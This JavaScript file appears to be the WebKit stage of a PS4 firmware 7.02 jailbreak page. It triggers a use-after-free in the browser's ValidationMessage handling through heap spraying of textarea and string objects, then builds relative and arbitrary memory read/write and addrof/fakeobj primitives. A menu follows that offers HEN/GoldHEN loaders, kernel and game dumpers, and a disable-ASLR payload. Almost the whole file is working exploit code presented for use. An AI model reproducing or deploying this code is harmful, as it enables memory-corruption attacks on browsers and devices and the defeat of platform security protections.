const OFFSET_ELEMENT_REFCOUNT = 0x10;
const OFFSET_JSAB_VIEW_VECTOR = 0x10;
const OFFSET_JSAB_VIEW_LENGTH = 0x18;
const OFFSET_LENGTH_STRINGIMPL = 0x04;
const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;

const LENGTH_ARRAYBUFFER = 0x8;
const LENGTH_STRINGIMPL = 0x14;
const LENGTH_JSVIEW = 0x20;
const LENGTH_VALIDATION_MESSAGE = 0x30;
const LENGTH_TIMER = 0x48;
const LENGTH_HTMLTEXTAREA = 0xd8;

const SPRAY_ELEM_SIZE = 0x6000;
const SPRAY_STRINGIMPL = 0x1000;

const NB_FRAMES = 0xfa0;
const NB_REUSE = 0x8000;

var g_arr_ab_1 = [];
var g_arr_ab_2 = [];
var g_arr_ab_3 = [];

var g_frames = [];

var g_relative_read = null;
var g_relative_rw = null;
var g_ab_slave = null;
var g_ab_index = null;

var g_timer_leak = null;
var g_jsview_leak = null;
var g_jsview_butterfly = null;
var g_message_heading_leak = null;
var g_message_body_leak = null;

var g_textarea_div_elem = null;

var g_obj_str = {};

var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";

var g_round = 1;
var g_input = null;

var guess_htmltextarea_addr = new Int64("0x2031b00d8");

var master_b = new Uint32Array(2);
var slave_b =  new Uint32Array(2);
var slave_addr;
var slave_buf_addr;
var master_addr;


/* Executed after deleteBubbleTree */
function setupRW() {
	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			g_relative_rw = g_arr_ab_3[i];
			debug_log("-> Succesfully got a relative R/W");
			break;
		}
	}
	if (g_relative_rw === null){
		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
        die("[!] Failed to setup a relative R/W primitive");
	}
	debug_log("-> Setting up arbitrary R/W");

	/* Retrieving the ArrayBuffer address using the relative read */
	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));

	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;

	/* Overding the length of one JSArrayBufferView with a known value */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;

	/* Looking for the slave JSArrayBufferView */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length === 0x41) {
			g_ab_slave = g_arr_ab_3[i];
			g_arr_ab_3 = null;
			break;
		}
	}
	if (g_ab_slave === null){
		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
        die("[!] Didn't found the slave JSArrayBufferView");
	}
	/* Extending the JSArrayBufferView length */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;

	debug_log("-> Testing arbitrary R/W");

	let saved_vtable = read64(guess_htmltextarea_addr);
	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141")){
		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
        die("[!] Failed to setup arbitrary R/W primitive");}
	debug_log("Exploited Successfully !!");
	localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
	
	setTimeout(function(){document.getElementById("progress").innerHTML="Select the Payloads in its Order of Execution and Click Run..";}, 3500);

	/* Restore the overidden vtable pointer */
	write64(guess_htmltextarea_addr, saved_vtable);

	/* Cleanup memory */
	cleanup();

	/* Set up addrof/fakeobj primitives */
	g_ab_slave.leakme = 0x1337;
	var bf = 0;
	for(var i = 15; i >= 8; i--)
		bf = 256 * bf + g_relative_rw[g_ab_index + i];
	g_jsview_butterfly = new Int64(bf);
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337"))){
		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
        die("[!] Failed to setup addrof/fakeobj primitives");}

	        document.getElementById("myProgress").remove();
            document.getElementById('load').innerHTML='<tr>'+
			        '<td align="center" colspan="2" >'+
			        '<a href="#" class="button pointer" onclick="load_payload();" style="background-color:white;color:#4863A0;width:50%">Run Selected Payload(s)</a>&nbsp;'+
			        '</td>'+
			        '</tr>'+
					'<tr>'+
			        '<td align="center" colspan="5">'+
			        '<br/><div style=font-size:16px;text-align:center;color:white;>Set Fan Treshold The PS4 default temp is 79c</div>'+
					'<a href="#" id="fan50" class="temp" onMouseOver="progress.innerHTML=\'Fan Control Set Temp 50c\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'fan50\'); return false" style="font-size:15px;text-align:center;color:#5B90F6">50c</a>&nbsp;'+
			        '<a href="#" id="fan55" class="temp" onMouseOver="progress.innerHTML=\'Fan Control Set Temp 55c\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'fan55\'); return false" style="font-size:15px;text-align:center;color:#5B90F6">55c</a>&nbsp;'+
			        '<a href="#" id="fan60" class="temp" onMouseOver="progress.innerHTML=\'Fan Control Set Temp 60c\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'fan60\'); return false" style="font-size:15px;text-align:center;color:#ff7f7f">60c</a>&nbsp;'+
			        '<a href="#" id="fan65" class="temp" onMouseOver="progress.innerHTML=\'Fan Control Set Temp 65c\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'fan65\'); return false" style="font-size:15px;text-align:center;color:#ff4c4c">65c</a>&nbsp;'+
			        '<a href="#" id="fan70" class="temp" onMouseOver="progress.innerHTML=\'Fan Control Set Temp 70c\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'fan70\'); return false" style="font-size:15px;text-align:center;color:#ff4c4c">70c</a>&nbsp;'+
			        '<a href="#" id="fan75" class="temp" onMouseOver="progress.innerHTML=\'Fan Control Set Temp 75c\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'fan75\'); return false" style="font-size:15px;text-align:center;color:#ff4c4c">75c</a>&nbsp;'+
			        '</td>'+
			        '</tr>'+
			        '<tr id="mexp">'+
			        '<td align="center" id="jailbreak" colspan="5" >'+
                    '<br/><div style=font-size:20px;text-align:center;color:yellow;>MIRA / HEN / GOLDHEN</div>'+
			        '<a href="#" id="hen" class="button pointer" onMouseOver="progress.innerHTML=\'HEN 2.1.3 By SiSTRo\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'hen\'); return false">HEN 2.1.3</a>&nbsp;'+
			        '<a href="#" id="henb" class="button pointer" onMouseOver="progress.innerHTML=\'HEN 2.1.3b By Leeful\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'henb\'); return false">HEN 2.1.3b</a>&nbsp;'+
			        '<a href="#" id="spoof" class="button pointer" onMouseOver="progress.innerHTML=\'Spoof to 9.99\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'spoof\'); return false">Spoofer 9.99</a>&nbsp;'+
			        '<a href="#" id="goldhen10" class="button pointer" onMouseOver="progress.innerHTML=\'GoldHen v1.0 by SiSTRo\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'goldhen10\'); return false" style="background-color: goldenrod;color: white">GoldHEN V1.0</a>&nbsp;'+
			        '<a href="#" id="goldhen11" class="button pointer" onMouseOver="progress.innerHTML=\'GoldHen v1.1 by SiSTRo\'"; onmouseout="progress.innerHTML=\'Night King 7.5X FW Full Auto V1.1\'" onclick="toggle_payload(\'goldhen11\'); return false" style="background-color: goldenrod;color: white">GoldHEN V1.1</a>&nbsp;'+
			        '</td>'+
			        '</tr>'+
			        '<br/>'+
			        '<tr>'+
					'<td align="center" colspan="5">'+
                    '<br/><div style=font-size:20px;text-align:center;color:yellow;>PAYLOADS</div>'+
					'<a href="#" id="orbistoolbox" class="button pointer" onMouseOver="progress.innerHTML=\'OSM Orbis ToolBox Alpha Build 1167\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'orbistoolbox\'); return false" style="background-color: orangered;color: white">Orbis-ToolBox</a>&nbsp;'+
			        '<a href="#" id="ps4trainer" class="button pointer" onMouseOver="progress.innerHTML=\'PS4 Offline Trainer\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="load_trainer(); return false" style="background-color: green;color: white">PS4 Offline Trainer</a>&nbsp;'+
			        '<a href="#" id="webrte" class="button pointer" onMouseOver="progress.innerHTML=\'WebRTE Payload to enable cheats using PS4 Trainer\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'webrte\'); return false" style="background-color: blue;color: white">WebRTE</a>&nbsp;'+
                    '<a href="#" id="binloader" class="button pointer" onMouseOver="progress.innerHTML=\'Bin Loader\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'binloader\'); return false">Bin-Loader</a>&nbsp;'+
			        '<a href="#" id="app2usb" class="button pointer" onMouseOver="progress.innerHTML=\'App to USB\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'app2usb\'); return false">App-2-USB</a>&nbsp;'+
					'</td>'+
					'</tr>'+
					'<br/>'+
					'<tr>'+
					'<td align="center" colspan="5">'+
					'<a href="#" id="disableupdates" class="button pointer" onMouseOver="progress.innerHTML=\'Disable Updates\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'disableupdates\'); return false">Disable-Updates</a>&nbsp;'+
			        '<a href="#" id="enableupdates" class="button pointer" onMouseOver="progress.innerHTML=\'Enable Updates\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'enableupdates\'); return false">Enable-Updates</a>&nbsp;'+
					'<a href="#" id="backup" class="button pointer" onMouseOver="progress.innerHTML=\'Backup database\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'backup\'); return false">Back-Up</a>&nbsp;'+
					'<a href="#" id="restore" class="button pointer" onMouseOver="progress.innerHTML=\'Restore database\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'restore\'); return false">Restore</a>&nbsp;'+
					'<a href="#" id="ftp" class="button pointer" onMouseOver="progress.innerHTML=\'FTP server\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'ftp\'); return false">FTP</a>&nbsp;'+
					'</td>'+
					'</tr>'+
					'<br/>'+
					'<tr>'+
					'<td align="center" colspan="5">'+
					'<a href="#" id="moduledumper" class="button pointer" onMouseOver="progress.innerHTML=\'Kernel Module Dumper\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'moduledumper\'); return false">Module-Dumper</a>&nbsp;'+
					'<a href="#" id="kerneldumper" class="button pointer" onMouseOver="progress.innerHTML=\'Kernel Dumper\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'kerneldumper\'); return false">Kernel-Dumper</a>&nbsp;'+
					'<a href="#" id="dumper" class="button pointer" onMouseOver="progress.innerHTML=\'Games Dumper\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'dumper\'); return false">Games-Dumper</a>&nbsp;'+
					'<a href="#" id="todex" class="button pointer" onMouseOver="progress.innerHTML=\'Enable DEX\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'todex\'); return false">To-DEX</a>&nbsp;'+
					'<a href="#" id="disableaslr" class="button pointer" onMouseOver="progress.innerHTML=\'Disable Aslr\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'disableaslr\'); return false">Disable-Aslr</a>&nbsp;'+
					'</td>'+
					'</tr>'+
					'<br/>'+
					'<tr>'+
					'<td align="center" colspan="5">'+
			        '<a href="#" id="enablebrowser" class="button pointer" onMouseOver="progress.innerHTML=\'Enable Browser\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'enablebrowser\'); return false">Enable-Browser</a>&nbsp;'+
			        '<a href="#" id="historyblocker" class="button pointer" onMouseOver="progress.innerHTML=\'History Blocker\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'historyblocker\'); return false">History-Blocker</a>&nbsp;'+
			        '<a href="#" id="linux1gb" class="button pointer" onMouseOver="progress.innerHTML=\'Linux Loader 1GB\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'linux1gb\'); return false">Linux-1GB</a>&nbsp;'+
			        '<a href="#" id="linux3gb" class="button pointer" onMouseOver="progress.innerHTML=\'Linux Loader 3GB\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'linux3gb\'); return false">Linux-3GB</a>&nbsp;'+
                    '<a href="#" id="kernelclock" class="button pointer" onMouseOver="progress.innerHTML=\'Reset Kernel Clock\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'kernelclock\'); return false">Kernel-Clock</a>&nbsp;'+
                    '</td>'+
			        '</tr>'+
			        '<br/>'+
			        '<tr>'+
			        '<td align="center" colspan="4">'+
					'<a href="#" id="rifrenamer" class="button pointer" onMouseOver="progress.innerHTML=\'Rif Renamer\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'rifrenamer\'); return false">Rif-Renamer</a>&nbsp;'+
			        '<a href="#" id="ps4debug" class="button pointer" onMouseOver="progress.innerHTML=\'CTN PS4Debug with rest mode support\'"; onmouseout="progress.innerHTML=\'Night King 7.02 FW Auto V1.2\'" onclick="toggle_payload(\'ps4debug\'); return false">PS4Debug</a>&nbsp;'+
					'</td>'+
					'</tr>'+
					'<tr><td><br/></td></tr>'+
					'<tr>';
	document.getElementById("div1").remove();
}

function toggle_payload(pld){
	if(pld=="hen" || pld=="binloader"){if(confirm("HEN (or) Binloader cannot be loaded with any other payloads\nDo you still want to load this payload alone ?")){document.getElementById("pldooe").value = pld; load_payload();}}
	else{
		var pldooe = document.getElementById("pldooe").value;
		var pldooe_full = document.getElementById("pldooe_full").value;
		var pld_full = document.getElementById(pld).innerHTML + ', ';
		pld = pld+',';
		if(pldooe==""){pldooe=pld;pldooe_full=pld_full;}else if(pldooe.includes(pld)){pldooe=pldooe.replace(pld,"");pldooe_full=pldooe_full.replace(pld_full,"");}else{pldooe+=pld;pldooe_full+=pld_full;}
		document.getElementById("pldooe").value = pldooe;
		document.getElementById("pldooe_full").value = pldooe_full;
		if(pldooe!=""){document.getElementById("progress").innerHTML="Order Of Execution - "+pldooe_full.slice(0, -2);}else{document.getElementById("progress").innerHTML="Select the Payloads in its Order of Execution and Click Run..";}
	}
}

function load_trainer(){
	var link = document.createElement('a');
		  document.body.appendChild(link);
		  link.href = 'http://night-king-host.com/Trainer/index.html';
		  link.click();
		  }

function load_payload(){
	var pld = document.getElementById("pldooe").value;
	if(pld != ""){
		var leak_slave = addrof(slave_b);
		var slave_addr = read64(leak_slave.add(0x10));
		og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
		var leak_master = addrof(master_b);
		write64(leak_master.add(0x10), leak_slave.add(0x10));
		var prim = {
			write8: function(addr, val) {
				master_b[0] = addr.low;
				master_b[1] = addr.hi;

				if(val instanceof int64) {
					slave_b[0] = val.low;
					slave_b[1] = val.hi;
				}
				else {
					slave_b[0] = val;
					slave_b[1] = 0;
				}

				master_b[0] = og_slave_addr.low;
				master_b[1] = og_slave_addr.hi;
			},
			write4: function(addr, val) {
				master_b[0] = addr.low;
				master_b[1] = addr.hi;

				slave_b[0] = val;

				master_b[0] = og_slave_addr.low;
				master_b[1] = og_slave_addr.hi;
			},
			read8: function(addr) {
				master_b[0] = addr.low;
				master_b[1] = addr.hi;
				var r = new int64(slave_b[0], slave_b[1]);
				master_b[0] = og_slave_addr.low;
				master_b[1] = og_slave_addr.hi;
				return r;
			},
			read4: function(addr) {
				master_b[0] = addr.low;
				master_b[1] = addr.hi;
				var r = slave_b[0];
				master_b[0] = og_slave_addr.low;
				master_b[1] = og_slave_addr.hi;
				return r;
			},
			leakval: function(val) {
				g_ab_slave.leakme = val;
				master_b[0] = g_jsview_butterfly.low32() - 0x10;
				master_b[1] = g_jsview_butterfly.hi32();
				var r = new int64(slave_b[0], slave_b[1]);
				master_b[0] = og_slave_addr.low;
				master_b[1] = og_slave_addr.hi;
				return r;
			},
		};
		window.prim = prim;
		if(pld=='hen'){
			hen();
		}else if(pld == 'binloader'){
			binloader();
		}else{
			stage2(pld.slice(0, -1));
		}
	}else{
		alert("Select payload(s) before clicking Run!!");
	}
}

function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	let arr = [];
	for (let i = 0; i < length; i++)
		arr.push(g_ab_slave[i]);
	return arr;
}

function read64(addr) {
	return new Int64(read(addr, 8));
}

function write(addr, data) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	for (let i = 0; i < data.length; i++)
		g_ab_slave[i] = data[i];
}

function write64(addr, data) {
	write(addr, data.bytes());
}

function addrof(obj) {
	g_ab_slave.leakme = obj;
	return read64(g_jsview_butterfly.sub(16));
}

function fakeobj(addr) {
	write64(g_jsview_butterfly.sub(16), addr);
	return g_ab_slave.leakme;
}

function cleanup() {
	select1.remove();
	select1 = null;
	input1.remove();
	input1 = null;
	input2.remove();
	input2 = null;
	input3.remove();
	input3 = null;
	div1.remove();
	div1 = null;
	g_input = null;
	g_rows1 = null;
	g_rows2 = null;
	g_frames = null;
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound2() {
	if (findTargetObj() === false) {
	localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
	die("[!] Failed to reuse target obj.");
}

	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();

	setTimeout(setupRW, 6000);
}


/* Executed after deleteBubbleTree */
function leakJSC() {
	debug_log("-> Looking for the smashed StringImpl...");

	var arr_str = Object.getOwnPropertyNames(g_obj_str);

	/* Looking for the smashed string */
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("-> StringImpl corrupted successfully");
			g_relative_read = arr_str[i];
			g_obj_str = null;
			break;
		}
	}
	if (g_relative_read === null){
		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
        die("[!] Failed to setup a relative read primitive");}

	debug_log("-> Got a relative read");

        var tmp_spray = {};
        for(var i = 0; i < 100000; i++)
                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;

	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);

	/* Spraying JSView */
	let tmp = [];
	for (let i = 0; i < 0x10000; i++) {
		/* The last allocated are more likely to be allocated after our relative read */
		if (i >= 0xfc00)
			g_arr_ab_3.push(new Uint8Array(ab));
		else
			tmp.push(new Uint8Array(ab));
	}
	tmp = null;

	/*
	 * Force JSC ref on FastMalloc Heap
	 * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
	 */
	var props = [];
	for (var i = 0; i < 0x400; i++) {
		props.push({ value: 0x42424242 });
		props.push({ value: g_arr_ab_3[i] });
	}

	/* 
	 * /!\
	 * This part must avoid as much as possible fastMalloc allocation
	 * to avoid re-using the targeted object 
	 * /!\ 
	 */
	/* Use relative read to find our JSC obj */
	/* We want a JSView that is allocated after our relative read */
	while (g_jsview_leak === null) {
		Object.defineProperties({}, props);
		for (let i = 0; i < 0x800000; i++) {
			var v = undefined;
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x13) === 0x42)
					v = new Int64(str2array(g_relative_read, 8, i + 8));
			}
			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
				g_jsview_leak = v;
				props = null;
				break;
			}
		}
	}
	/* 
	 * /!\
	 * Critical part ended-up here
	 * /!\ 
	 */

	debug_log("-> JSArrayBufferView: " + g_jsview_leak);

	/* Run the exploit again */
	prepareUAF();
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound1() {
	/* Force allocation of StringImpl obj. beyond Timer address */
	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);

	/* Checking for leaked data */
	if (findTargetObj() === false){
		localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
        die("[!] Failed to reuse target obj.");}

	dumpTargetObj();

	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();

	/*
	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
	 * the next 5s
	 */
	setTimeout(leakJSC, 6000);
}

function handle2() {
	/* focus elsewhere */
	input2.focus();
}

function reuseTargetObj() {
	/* Delete ValidationMessage instance */
	document.body.appendChild(g_input);

	/*
	 * Free ValidationMessage neighboors.
	 * SmallLine is freed -> SmallPage is cached
	 */
	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
		g_frames[i].setAttribute("rows", ',');

	/* Get back target object */
	for (let i = 0; i < NB_REUSE; i++) {
		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
		let view = new Float64Array(ab);

		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble

		g_arr_ab_1.push(view);
	}

	if (g_round == 1) {
		/*
		 * Spray a couple of StringImpl obj. prior to Timer allocation
		 * This will force Timer allocation on same SmallPage as our Strings
		 */
		sprayStringImpl(0, SPRAY_STRINGIMPL);

		g_frames = [];
		g_round += 1;
		g_input = input3;

		setTimeout(confuseTargetObjRound1, 10);
	} else {
		setTimeout(confuseTargetObjRound2, 10);
	}
}

function dumpTargetObj() {
	debug_log("-> m_timer: " + g_timer_leak);
	debug_log("-> m_messageHeading: " + g_message_heading_leak);
	debug_log("-> m_messageBody: " + g_message_body_leak);
}

function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("-> Found fake ValidationMessage");

			if (g_round === 2) {
				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
				g_round++;
			}

			g_fake_validation_message = g_arr_ab_1[i];
			g_arr_ab_1 = [];
			return true;
		}
	}
	return false;
}

function prepareUAF() {
	g_input.setCustomValidity("ps4");

	for (let i = 0; i < NB_FRAMES; i++) {
		var element = document.createElement("frameset");
		g_frames.push(element);
	}

	g_input.reportValidity();
	var div = document.createElement("div");
	document.body.appendChild(div);
	div.appendChild(g_input);

	/* First half spray */
	for (let i = 0; i < NB_FRAMES/2 ; i++)
		g_frames[i].setAttribute("rows", g_rows1);

	/* Instantiate target obj */
	g_input.reportValidity();

	/* ... and the second half */
	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
		g_frames[i].setAttribute("rows", g_rows2);

	g_input.setAttribute("onfocus", "reuseTargetObj()");
	g_input.autofocus = true;
	
}

/* HTMLElement spray */
function sprayHTMLTextArea() {
	debug_log("-> Spraying HTMLTextareaElement ...");
	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");

	/* Add a style to avoid textarea display */
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

	/*
	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
	 * allocation of the node attributes and an IsoHeap allocation of the
	 * Element. The virtual page layout will look something like that:
	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
	 */
	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}

/* StringImpl Spray */
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}

function go() {
	if(localStorage.is702Cached){
		/* Init spray */
		sprayHTMLTextArea();
		g_input = input1;
		/* Shape heap layout for obj. reuse */
		prepareUAF();
	}
}
